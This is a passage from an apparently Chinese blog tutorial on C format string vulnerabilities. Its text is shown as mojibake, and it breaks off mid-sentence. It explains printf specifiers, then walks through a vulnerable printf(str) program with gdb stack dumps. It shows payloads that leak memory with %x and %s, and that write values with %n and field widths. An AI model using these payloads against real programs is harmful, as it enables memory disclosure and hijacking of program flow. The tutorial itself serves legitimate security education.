class="line-numbers-rows"><span></span></span></code></pre>ä¸­æ‹¬å·ä¸­çš„å±æ€§æ˜¯å¯é€‰çš„ï¼Œä¸éœ€è¦ä¸€å®šéƒ½å†™ä¸Šï¼Œæ¯”å¦‚%08xï¼Œä»–å°±åªç”¨åˆ°äº†å…¶ä¸­çš„ä¸€éƒ¨åˆ†ã€‚ä¸‹é¢ä¸¾å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å±æ€§è®²ä¸€ä¸‹ï¼š<br><code>parameter</code></li><li>n$ï¼Œè·å–æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„æŒ‡å®šå‚æ•°<br><code>flag</code><br><code>field width</code>ï¼Œè¾“å‡ºçš„æœ€å°å®½åº¦<br><code>precision</code>ï¼Œè¾“å‡ºçš„æœ€å¤§é•¿åº¦<br><code>length</code>ï¼Œè¾“å‡ºçš„é•¿åº¦</li><li>hhï¼Œè¾“å‡ºä¸€ä¸ªå­—èŠ‚</li><li>hï¼Œè¾“å‡ºä¸€ä¸ªåŒå­—èŠ‚<br><code>type</code></li><li>d/iï¼Œæœ‰ç¬¦å·æ•´æ•°</li><li>uï¼Œæ— ç¬¦å·æ•´æ•°</li><li>x/Xï¼Œ16 è¿›åˆ¶ unsigned int ã€‚x ä½¿ç”¨å°å†™å­—æ¯ï¼›X ä½¿ç”¨å¤§å†™å­—æ¯ã€‚å¦‚æœæŒ‡å®šäº†ç²¾åº¦ï¼Œåˆ™è¾“å‡ºçš„æ•°å­—ä¸è¶³æ—¶åœ¨å·¦ä¾§è¡¥ 0ã€‚é»˜è®¤ç²¾åº¦ä¸º 1ã€‚ç²¾åº¦ä¸º 0 ä¸”å€¼ä¸º 0ï¼Œåˆ™è¾“å‡ºä¸ºç©ºã€‚</li><li>oï¼Œ8 è¿›åˆ¶ unsigned int ã€‚å¦‚æœæŒ‡å®šäº†ç²¾åº¦ï¼Œåˆ™è¾“å‡ºçš„æ•°å­—ä¸è¶³æ—¶åœ¨å·¦ä¾§è¡¥ 0ã€‚é»˜è®¤ç²¾åº¦ä¸º 1ã€‚ç²¾åº¦ä¸º 0 ä¸”å€¼ä¸º 0ï¼Œåˆ™è¾“å‡ºä¸ºç©ºã€‚</li><li>sï¼Œå¦‚æœæ²¡æœ‰ç”¨ l æ ‡å¿—ï¼Œè¾“å‡º null ç»“å°¾å­—ç¬¦ä¸²ç›´åˆ°ç²¾åº¦è§„å®šçš„ä¸Šé™ï¼›å¦‚æœæ²¡æœ‰æŒ‡å®šç²¾åº¦ï¼Œåˆ™è¾“å‡ºæ‰€æœ‰å­—èŠ‚ã€‚å¦‚æœç”¨äº† l æ ‡å¿—ï¼Œåˆ™å¯¹åº”å‡½æ•°å‚æ•°æŒ‡å‘ wchar_t å‹çš„æ•°ç»„ï¼Œè¾“å‡ºæ—¶æŠŠæ¯ä¸ªå®½å­—ç¬¦è½¬åŒ–ä¸ºå¤šå­—èŠ‚å­—ç¬¦ï¼Œç›¸å½“äºè°ƒç”¨ wcrtomb å‡½æ•°ã€‚</li><li>cï¼Œå¦‚æœæ²¡æœ‰ç”¨ l æ ‡å¿—ï¼ŒæŠŠ int å‚æ•°è½¬ä¸º unsigned char å‹è¾“å‡ºï¼›å¦‚æœç”¨äº† l æ ‡å¿—ï¼ŒæŠŠ wint_t å‚æ•°è½¬ä¸ºåŒ…å«ä¸¤ä¸ªå…ƒç´ çš„ wchart_t æ•°ç»„ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ åŒ…å«è¦è¾“å‡ºçš„å­—ç¬¦ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¸º null å®½å­—ç¬¦ã€‚</li><li>pï¼Œ void * å‹ï¼Œè¾“å‡ºå¯¹åº”å˜é‡çš„å€¼ã€‚printf(â€œ%pâ€,a) ç”¨åœ°å€çš„æ ¼å¼æ‰“å°å˜é‡ a çš„å€¼ï¼Œprintf(â€œ%pâ€, &amp;a) æ‰“å°å˜é‡ a æ‰€åœ¨çš„åœ°å€ã€‚</li><li>nï¼Œä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚</li><li>%ï¼Œ â€˜%â€™å­—é¢å€¼ï¼Œä¸æ¥å—ä»»ä½• flags, widthã€‚<h3 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h3>è¦è¾“å‡ºçš„å˜é‡</li></ul></blockquote><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>æ ¼å¼åŒ–ä¸²æ¼æ´å’Œæ™®é€šçš„æ ˆæº¢å‡ºæœ‰ç›¸ä¼¼ä¹‹å¤„ï¼Œéƒ½æ˜¯åˆ©ç”¨ç¨‹åºå‘˜çš„ç–å¿½å¤§æ„æ¥æ”¹å˜ç¨‹åºè¿è¡Œçš„æ­£å¸¸æµç¨‹ã€‚<br>é¦–å…ˆï¼Œä»€ä¹ˆæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œprint()ã€fprint()ç­‰<code>*print()</code>ç³»åˆ—çš„å‡½æ•°å¯ä»¥æŒ‰ç…§ä¸€å®šçš„æ ¼å¼å°†æ•°æ®è¿›è¡Œè¾“å‡ºï¼Œä¸¾ä¸ªæœ€ç®€å•çš„ä¾‹å­ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">printf(&quot;My Name is:  %s&quot; , &quot;Zechariah&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>æ‰§è¡Œè¯¥å‡½æ•°åå°†è¿”å›å­—ç¬¦ä¸²ï¼šMy Name isï¼šZechariah<br>è¯¥printfå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå®ƒæ¥å‘Šè¯‰ç¨‹åºå°†æ•°æ®ä»¥ä»€ä¹ˆæ ¼å¼è¾“å‡ºã€‚<br>printf()å‡½æ•°çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼š<code>printf(&quot;format&quot;, è¾“å‡ºè¡¨åˆ—)</code>ï¼Œæˆ‘ä»¬å¯¹formatæ¯”è¾ƒå…³å¿ƒï¼Œçœ‹ä¸€ä¸‹å®ƒçš„ç»“æ„å§ï¼š<code>%[æ ‡å¿—][è¾“å‡ºæœ€å°å®½åº¦][.ç²¾åº¦][é•¿åº¦]ç±»å‹</code>,å…¶ä¸­è·Ÿæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æœ‰å…³ç³»çš„ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š<br>1ã€è¾“å‡ºæœ€å°å®½åº¦ï¼šç”¨åè¿›åˆ¶æ•´æ•°æ¥è¡¨ç¤ºè¾“å‡ºçš„æœ€å°‘ä½æ•°ã€‚è‹¥å®é™…ä½æ•°å¤šäºå®šä¹‰çš„å®½åº¦ï¼Œåˆ™æŒ‰å®é™…ä½æ•°è¾“å‡ºï¼Œè‹¥å®é™…ä½æ•°å°‘äºå®šä¹‰çš„å®½åº¦åˆ™è¡¥ä»¥ç©ºæ ¼æˆ–0ã€‚<br>2ã€ç±»å‹ï¼š<br><pre class="line-numbers language-none"><code class="language-none">%cï¼šè¾“å‡ºå­—ç¬¦ï¼Œé…ä¸Š%nå¯ç”¨äºå‘æŒ‡å®šåœ°å€å†™æ•°æ®ã€‚%dï¼šè¾“å‡ºåè¿›åˆ¶æ•´æ•°ï¼Œé…ä¸Š%nå¯ç”¨äºå‘æŒ‡å®šåœ°å€å†™æ•°æ®ã€‚%xï¼šè¾“å‡º16è¿›åˆ¶æ•°æ®ï¼Œå¦‚%i$xè¡¨ç¤ºè¦æ³„æ¼åç§»iå¤„4å­—èŠ‚é•¿çš„16è¿›åˆ¶æ•°æ®ï¼Œ%i$1xè¡¨ç¤ºè¦æ³„æ¼åç§»iå¤„8å­—èŠ‚é•¿çš„16è¿›åˆ¶æ•°æ®ï¼Œ32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ã€‚%pï¼šè¾“å‡º16è¿›åˆ¶æ•°æ®ï¼Œä¸%xåŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯é™„åŠ äº†å‰ç¼€0xï¼Œåœ¨32bitä¸‹è¾“å‡º4å­—èŠ‚ï¼Œåœ¨64bitä¸‹è¾“å‡º8å­—èŠ‚ï¼Œå¯é€šè¿‡è¾“å‡ºå­—èŠ‚çš„é•¿åº¦æ¥åˆ¤æ–­ç›®æ ‡ç¯å¢ƒæ˜¯32bitè¿˜æ˜¯64bitã€‚%sï¼šè¾“å‡ºçš„å†…å®¹æ˜¯å­—ç¬¦ä¸²ï¼Œå³å°†åç§»å¤„æŒ‡é’ˆæŒ‡å‘çš„å­—ç¬¦ä¸²è¾“å‡ºï¼Œå¦‚%i$sè¡¨ç¤ºè¾“å‡ºåç§»iå¤„åœ°å€æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œåœ¨32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ï¼Œå¯ç”¨äºè¯»å–GOTè¡¨ç­‰ä¿¡æ¯ã€‚%nï¼šå°†%nä¹‹å‰printfå·²ç»æ‰“å°çš„å­—ç¬¦ä¸ªæ•°èµ‹å€¼ç»™åç§»å¤„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ä½ç½®ï¼Œå¦‚%100x10$nè¡¨ç¤ºå°†ex64å†™å…¥åç§»10å¤„ä¿å­˜çš„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ï¼ˆ4å­—èŠ‚ï¼‰ï¼Œè€Œ%$hnè¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸º2å­—èŠ‚ï¼Œ%$hhnè¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸º1å­—èŠ‚ï¼Œ%$llnè¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸ºå…«å­—èŠ‚ï¼Œåœ¨32bitå’Œ64bitç¯å¢ƒä¸‹ä¸€æ ·ã€‚æœ‰æ—¶ï¼Œç›´æ¥å†™4å­—èŠ‚ä¼šå¯¼è‡´ç¨‹åºå´©æºƒæˆ–ç­‰å€™æ—¶é—´è¿‡é•¿ï¼Œå¯ä»¥é€šè¿‡%$hnæˆ–%$hhnæ¥é€‚æ—¶è°ƒæ•´%næ˜¯é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ”¹å˜ç¨‹åºæµç¨‹çš„å…³é”®æ–¹å¼ï¼Œè€Œå…¶ä»–æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°å¯ç”¨äºè¯»å–ä¿¡æ¯æˆ–é…åˆ%nå†™æ•°æ®ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>å…³äºprintf()å‡½æ•°çš„ä½¿ç”¨ï¼Œæ­£å¸¸æˆ‘ä»¬ä½¿ç”¨printf()å‡½æ•°åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">char str[100];scanf(&quot;%s&quot;,str);printf(&quot;%s&quot;,str);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™æ˜¯æ­£ç¡®çš„ä½¿ç”¨æ–¹å¼ï¼Œä½†æ˜¯ä¹Ÿæœ‰çš„äººä¼šè¿™ä¹ˆç”¨ï¼š<br><pre class="line-numbers language-c" data-language="c"><code class="language-c">char str[100];scanf(&quot;%s&quot;,str);printf(str)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>æˆ‘ä»¬å¯ä»¥å¯¹æ¯”ä¸€ä¸‹è¿™ä¸¤æ®µä»£ç ï¼Œå¾ˆæ˜æ˜¾ï¼Œç¬¬äºŒä¸ªç¨‹åºä¸­çš„printf()å‡½æ•°å‚æ•°æˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œ<strong>æˆ‘ä»¬åœ¨æ§åˆ¶äº†formatå‚æ•°ä¹‹åç»“åˆprintf()å‡½æ•°çš„ç‰¹æ€§å°±å¯ä»¥è¿›è¡Œç›¸åº”çš„æ”»å‡»ã€‚</strong></p><h2 id="å‡½æ•°ç‰¹æ€§"><a href="#å‡½æ•°ç‰¹æ€§" class="headerlink" title="å‡½æ•°ç‰¹æ€§"></a>å‡½æ•°ç‰¹æ€§</h2><h4 id="ç‰¹æ€§ä¸€ï¼š-printf-å‡½æ•°çš„å‚æ•°ä¸ªæ•°ä¸å›ºå®š"><a href="#ç‰¹æ€§ä¸€ï¼š-printf-å‡½æ•°çš„å‚æ•°ä¸ªæ•°ä¸å›ºå®š" class="headerlink" title="ç‰¹æ€§ä¸€ï¼š printf()å‡½æ•°çš„å‚æ•°ä¸ªæ•°ä¸å›ºå®š"></a>ç‰¹æ€§ä¸€ï¼š printf()å‡½æ•°çš„å‚æ•°ä¸ªæ•°ä¸å›ºå®š</h4><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹æ€§è¿›è¡Œè¶Šç•Œæ•°æ®çš„è®¿é—®ã€‚æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸ªæ­£å¸¸çš„ç¨‹åºï¼š<br><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;int main(void)&#123;int a&#x3D;1,b&#x3D;2,c&#x3D;3;char buf[]&#x3D;&quot;test&quot;;printf(&quot;%s %d %d %d\n&quot;,buf,a,b,c);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>æˆ‘ä»¬ç¼–è¯‘ä¹‹åè¿è¡Œï¼š</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">[email protected]:~&#x2F;Desktop&#x2F;format$ gcc -fno-stack-protector -o format format.c[email protected]:~&#x2F;Desktop&#x2F;format$ .&#x2F;format test 1 2 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥æˆ‘ä»¬åšä¸€ä¸‹æµ‹è¯•ï¼Œæˆ‘ä»¬å¢åŠ ä¸€ä¸ªprintf()çš„formatå‚æ•°ï¼Œæ”¹ä¸ºï¼š<br><code>printf(&quot;%s %d %d %d %x\n&quot;,buf,a,bï¼Œc)</code>ï¼Œç¼–è¯‘åè¿è¡Œï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">[email protected]:~&#x2F;Desktop&#x2F;format$ gcc -z execstack -fno-stack-protector -o format1 format.cformat.c: In function â€˜mainâ€™:format.c:6:1: warning: format â€˜%xâ€™ expects a matching â€˜unsigned intâ€™ argument [-Wformat&#x3D;] printf(&quot;%s %d %d %d %x\n&quot;,buf,a,b,c); ^[email protected]:~&#x2F;Desktop&#x2F;format$ .&#x2F;format1test 1 2 3 c30000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>è™½ç„¶gccåœ¨ç¼–è¯‘çš„æ—¶å€™æç¤ºäº†ä¸€ä¸ªwarningï¼Œä½†è¿˜æ˜¯ç¼–è¯‘é€šè¿‡äº†ï¼Œæˆ‘ä»¬è¿è¡Œåå‘ç°å¤šè¾“å‡ºäº†ä¸€ä¸ªC30000ï¼Œè¿™æ˜¯ä¸ªä»€ä¹ˆæ•°æ®å‘¢ï¼Œæˆ‘ä»¬ç”¨gdbè°ƒè¯•ä¸€ä¸‹çœ‹çœ‹å§ï¼Œæˆ‘ä»¬åœ¨printf()å‡½æ•°å¤„ä¸‹ä¸ªæ–­ç‚¹ï¼Œç„¶åè¿è¡Œç¨‹åºï¼Œç¨‹åºåœåœ¨äº†<code>printf()</code>å‡½æ•°å…¥å£å¤„<code>0xb7e652f0 __printf+0 push %ebx</code>ã€‚<br>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆå¸ƒå±€ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">&gt;&gt;&gt; x&#x2F;10x $sp0xbffff00c: 0x08048466  0x08048510  0xbffff03f  0x000000010xbffff01c: 0x00000002  0x00000003  0x00c30000  0x000000010xbffff02c: 0x080482bd  0xbffff2c4 &gt;&gt;&gt; x&#x2F;20x $sp0xbffff00c: 0x08048466  0x08048510  0xbffff03f  0x000000010xbffff01c: 0x00000002  0x00000003  0x00c30000  0x000000010xbffff02c: 0x080482bd  0xbffff2c4  0x0000002f  0x0804a0000xbffff03c: 0x740484d2  0x00747365  0x00000003  0x000000020xbffff04c: 0x00000001  0xb7fc13c4  0xbffff070  0x00000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![[Pasted image 20250209183436.png]]<br>åªè¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶formatçš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¸€ç›´è¯»å–å†…å­˜æ•°æ®ã€‚<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">printf(&quot;%s %d %d %d %x %x %x %x %x %x %x %x\n&quot;,buf,a,b,c)[email protected]:~&#x2F;Desktop&#x2F;format$ .&#x2F;format2test 1 2 3 c30000 1 80482bd bf8bf301 2f 804a000 740484d2 747365<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>ä¸Šä¸€ä¸ªä¾‹å­åªæ˜¯å‘Šè¯‰æˆ‘ä»¬å¯ä»¥åˆ©ç”¨%xä¸€ç›´è¯»å–æ ˆå†…çš„å†…å­˜æ•°æ®ï¼Œå¯æ˜¯è¿™å¹¶ä¸èƒ½æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ä¸æ˜¯ï¼Œæˆ‘ä»¬è¦çš„æ˜¯<code>ä»»æ„åœ°å€è¯»å–</code>,å½“ç„¶ï¼Œè¿™ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæˆ‘ä»¬é€šè¿‡ä¸‹é¢çš„ä¾‹å­è¿›è¡Œåˆ†æï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123;    char str[200];    fgets(str,200,stdin);    printf(str);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>æˆ‘ä»¬å¯ä»¥ç›´æ¥å°è¯•å»è¯»å–str[]çš„å†…å®¹å‘¢<br>gdbè°ƒè¯•ï¼Œå•æ­¥è¿è¡Œå®Œ<code>call 0x8048340 &lt;[email protected]&gt;</code>åè¾“å…¥ï¼š<br><code>AAAA%08x%08x%08x%08x%08x%08x</code><br>ç„¶åæˆ‘ä»¬æ‰§è¡Œåˆ°printf()å‡½æ•°ï¼Œè§‚å¯Ÿæ­¤æ—¶çš„æ ˆåŒºï¼Œç‰¹åˆ«æ³¨æ„ä¸€ä¸‹0x41414141ï¼ˆè¿™æ˜¯æˆ‘ä»¬strçš„å¼€å§‹ï¼‰ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">&gt;&gt;&gt; x&#x2F;10x $sp0xbfffef70: 0xbfffef88  0x000000c8  0xb7fc1c20  0xb7e254380xbfffef80: 0x08048210  0x00000001  0x41414141  0x783830250xbfffef90: 0x78383025  0x78383025<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>è¿™æ—¶å€™æˆ‘ä»¬éœ€è¦å€ŸåŠ©printf()å‡½æ•°çš„å¦ä¸€ä¸ªé‡è¦çš„æ ¼å¼åŒ–å­—ç¬¦å‚æ•°%sï¼Œæˆ‘ä»¬å¯ä»¥ç”¨%sæ¥è·å–æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜æ•°æ®ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¿™ä¹ˆæ„é€ å°è¯•å»è·å–0x41414141åœ°å€ä¸Šçš„æ•°æ®ï¼š<br><code>\x41\x41\x41\x41%08x%08x%08x%08x%08x%s</code><br>åˆ°ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¯»å–å†…å­˜çš„å†…å®¹ï¼Œçœ‹èµ·æ¥å¥½åƒä¹Ÿæ²¡ä»€ä¹ˆç”¨å•Šï¼Œå°±æ˜¯è¯»ä¸ªæ•°æ®è€Œå·²ï¼Œæˆ‘ä»¬èƒ½ä¸èƒ½åˆ©ç”¨è¿™ä¸ªæ¼æ´ä¿®æ”¹å†…å­˜ä¿¡æ¯ï¼ˆæ¯”å¦‚è¯´ä¿®æ”¹è¿”å›åœ°å€ï¼‰ä»è€ŒåŠ«æŒç¨‹åºæ‰§è¡Œæµç¨‹?</p><h4 id="ç‰¹æ€§äºŒï¼šåˆ©ç”¨-næ ¼å¼ç¬¦å†™å…¥æ•°æ®"><a href="#ç‰¹æ€§äºŒï¼šåˆ©ç”¨-næ ¼å¼ç¬¦å†™å…¥æ•°æ®" class="headerlink" title="ç‰¹æ€§äºŒï¼šåˆ©ç”¨%næ ¼å¼ç¬¦å†™å…¥æ•°æ®"></a>ç‰¹æ€§äºŒï¼šåˆ©ç”¨%næ ¼å¼ç¬¦å†™å…¥æ•°æ®</h4><p>%næ˜¯ä¸€ä¸ªä¸ç»å¸¸ç”¨åˆ°çš„æ ¼å¼ç¬¦ï¼Œå®ƒçš„ä½œç”¨æ˜¯æŠŠå‰é¢å·²ç»æ‰“å°çš„é•¿åº¦å†™å…¥æŸä¸ªå†…å­˜åœ°å€ï¼Œçœ‹ä¸‹é¢çš„ä»£ç ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;main()&#123;  int num&#x3D;66666666;   printf(&quot;Before: num &#x3D; %d\n&quot;, num);  printf(&quot;%d%n\n&quot;, num, &amp;num);  printf(&quot;After: num &#x3D; %d\n&quot;, num); &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>å¯ä»¥å‘ç°æˆ‘ä»¬ç”¨%næˆåŠŸä¿®æ”¹äº†numçš„å€¼ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">[email protected]:~&#x2F;Desktop&#x2F;format$ .&#x2F;format2Before: num &#x3D; 6666666666666666After: num &#x3D; 8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>ç°åœ¨æˆ‘ä»¬å·²ç»çŸ¥é“å¯ä»¥ç”¨æ„é€ çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å»è®¿é—®æ ˆå†…çš„æ•°æ®ï¼Œå¹¶ä¸”<strong>å¯ä»¥åˆ©ç”¨%nå‘å†…å­˜ä¸­å†™å…¥å€¼</strong>ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ä¿®æ”¹æŸä¸€ä¸ªå‡½æ•°çš„è¿”å›åœ°å€ä»è€Œæ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹å‘¢ï¼Œåˆ°äº†è¿™ä¸€æ­¥ç»†å¿ƒçš„åŒå­¦å¯èƒ½å·²ç»å‘ç°äº†ï¼Œ%nçš„ä½œç”¨åªæ˜¯å°†å‰é¢æ‰“å°çš„å­—ç¬¦ä¸²é•¿åº¦å†™å…¥åˆ°å†…å­˜ä¸­ï¼Œè€Œæˆ‘ä»¬æƒ³è¦å†™å…¥çš„æ˜¯ä¸€ä¸ªåœ°å€ï¼Œè€Œä¸”è¿™ä¸ªåœ°å€æ˜¯å¾ˆå¤§çš„ã€‚è¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°printf()å‡½æ•°çš„ç¬¬ä¸‰ä¸ªç‰¹æ€§æ¥é…åˆå®Œæˆåœ°å€çš„å†™å…¥ã€‚</p><h4 id="ç‰¹æ€§ä¸‰ï¼šè‡ªå®šä¹‰æ‰“å°å­—ç¬¦ä¸²å®½åº¦"><a href="#ç‰¹æ€§ä¸‰ï¼šè‡ªå®šä¹‰æ‰“å°å­—ç¬¦ä¸²å®½åº¦" class="headerlink" title="ç‰¹æ€§ä¸‰ï¼šè‡ªå®šä¹‰æ‰“å°å­—ç¬¦ä¸²å®½åº¦"></a>ç‰¹æ€§ä¸‰ï¼šè‡ªå®šä¹‰æ‰“å°å­—ç¬¦ä¸²å®½åº¦</h4><p>æˆ‘ä»¬åœ¨ä¸Šé¢çš„åŸºç¡€éƒ¨åˆ†å·²ç»æœ‰æåˆ°å…³äºæ‰“å°å­—ç¬¦ä¸²å®½åº¦çš„é—®é¢˜ï¼Œ<strong>åœ¨æ ¼å¼ç¬¦ä¸­é—´åŠ ä¸Šä¸€ä¸ªåè¿›åˆ¶æ•´æ•°æ¥è¡¨ç¤ºè¾“å‡ºçš„æœ€å°‘ä½æ•°ï¼Œè‹¥å®é™…ä½æ•°å¤šäºå®šä¹‰çš„å®½åº¦ï¼Œåˆ™æŒ‰å®é™…ä½æ•°è¾“å‡ºï¼Œè‹¥å®é™…ä½æ•°å°‘äºå®šä¹‰çš„å®½åº¦åˆ™è¡¥ä»¥ç©ºæ ¼æˆ–0</strong>ã€‚æˆ‘ä»¬æŠŠä¸Šä¸€æ®µä»£ç åšä¸€ä¸‹ä¿®æ”¹å¹¶çœ‹ä¸€ä¸‹æ•ˆæœï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;main()&#123;  int num&#x3D;66666666;   printf(&quot;Before: num &#x3D; %d\n&quot;, num);  printf(&quot;%.100d%n\n&quot;, num, &amp;num);  printf(&quot;After: num &#x3D; %d\n&quot;, num);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„numå€¼è¢«æ”¹ä¸ºäº†100<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">[email protected]:~&#x2F;Desktop&#x2F;format$ .&#x2F;format2Before: num &#x3D; 666666660000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000066666666After: num &#x3D; 100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>å¦‚ä½•å»è¦†ç›–ä¸€ä¸ªåœ°å€ï¼Ÿï¼Œä¾‹å¦‚æŠŠ0x8048000è¿™ä¸ªåœ°å€å†™å…¥å†…å­˜ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯æŠŠè¯¥<strong>åœ°å€å¯¹åº”çš„10è¿›åˆ¶134512640</strong>ä½œä¸ºæ ¼å¼ç¬¦æ§åˆ¶å®½åº¦å³å¯ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">printf(&quot;%.134512640d%n\n&quot;, num, &amp;num);printf(&quot;After: num &#x3D; %x\n&quot;, num);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„numè¢«æˆåŠŸä¿®æ”¹ä¸º8048000<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">[email protected]:~&#x2F;Desktop&#x2F;format$ .&#x2F;format2Before: num &#x3D; 66666666ä¸­é—´çš„0çœç•¥...........00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000066666666After: num &#x3D; 8048000[email protected]:~&#x2F;Desktop&#x2F;format$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="æ¼æ´åˆ©ç”¨åŸç†"><a href="#æ¼æ´åˆ©ç”¨åŸç†" class="headerlink" title="æ¼æ´åˆ©ç”¨åŸç†"></a>æ¼æ´åˆ©ç”¨åŸç†</h3><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ˜¯æ ¹æ®æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥è¿›è¡Œè§£æçš„ï¼Œé‚£ä¹ˆå“åº”çš„è¦è¢«è§£æçš„å‚æ•°çš„ä¸ªæ•°ä¹Ÿæ˜¯ç”±è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰€æ§åˆ¶ã€‚<br>![[Pasted image 20250210182528.png]]<br>æ­£å¸¸çš„printfå‡½æ•°çš„ç»“æ„æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸å‚æ•°ä¸€ä¸€å¯¹åº”çš„ã€‚é‚£ä¹ˆåœ¨è°ƒç”¨printfå‡½æ•°çš„æ—¶å€™å‚æ•°ä»å³å‘å·¦è¿›æ ˆï¼Œè¿›æ ˆä¹‹åæ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯åœ¨æ 